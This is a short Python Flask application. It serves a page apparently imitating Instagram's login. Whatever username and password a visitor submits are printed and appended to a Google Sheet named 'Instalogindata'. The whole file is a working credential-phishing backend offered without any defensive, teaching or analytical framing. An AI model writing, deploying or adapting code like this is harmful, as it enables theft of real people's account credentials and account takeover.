import os
import json
import gspread
from flask import Flask, request, render_template
from oauth2client.service_account import ServiceAccountCredentials

app = Flask(__name__)

# Google Sheets Setup
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds_json = json.loads(os.environ["GOOGLE_CREDS"])
creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_json, scope)
client = gspread.authorize(creds)
sheet = client.open("Instalogindata").worksheet("LoginData")  # Match name exactly

@app.route("/", methods=["GET"])
def home():
    return render_template("instagram_login.html")

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print("Username:", username)
        print("Password:", password)
        sheet.append_row([username, password])
    return render_template("instagram_login.html")

# Optional health check or debug route
@app.route("/status")
def status():
    return "Deployment successful!"

if __name__ == "__main__":
    app.run(debug=True)
